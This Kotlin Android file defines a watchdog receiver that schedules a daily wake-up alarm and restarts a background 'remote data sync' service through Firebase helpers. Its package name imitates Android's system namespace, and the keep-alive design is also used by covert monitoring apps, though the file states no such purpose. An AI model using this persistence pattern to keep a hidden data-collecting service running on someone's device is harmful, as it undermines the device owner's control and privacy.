package com.android.services.receiver

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import android.util.Log
import com.android.services.util.FirebasePushUtils
import com.android.services.util.logVerbose

class WatchDogAlarmReceiver : BroadcastReceiver() {
    companion object {
        const val WATCH_DOG_RECIEVER_INTERVAL = 1000 * 60 * 60 * 24
        const val TAG = "WatchDogAlarmReceiver"
    }

    override fun onReceive(context: Context?, p1: Intent?) {
        val powerManager = context!!.getSystemService(Context.POWER_SERVICE) as PowerManager
        val wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "")
        wakeLock.acquire()
        // Put here YOUR code.
        logVerbose("$TAG watchDogReceiver Event Calling")
        logVerbose("$TAG watchDogReceiver checking Service Status")
        FirebasePushUtils.restartRemoteDataSyncService(context, false)
        wakeLock.release()
    }

    fun setAlarm(context: Context) {
        val am = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val i = Intent(context, WatchDogAlarmReceiver::class.java)
        val pi = PendingIntent.getBroadcast(context, 0, i, 0)
        am.setRepeating(
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis(),
            (WATCH_DOG_RECIEVER_INTERVAL).toLong(),
            pi
        ) // Millisec * Second * Minute
    }

}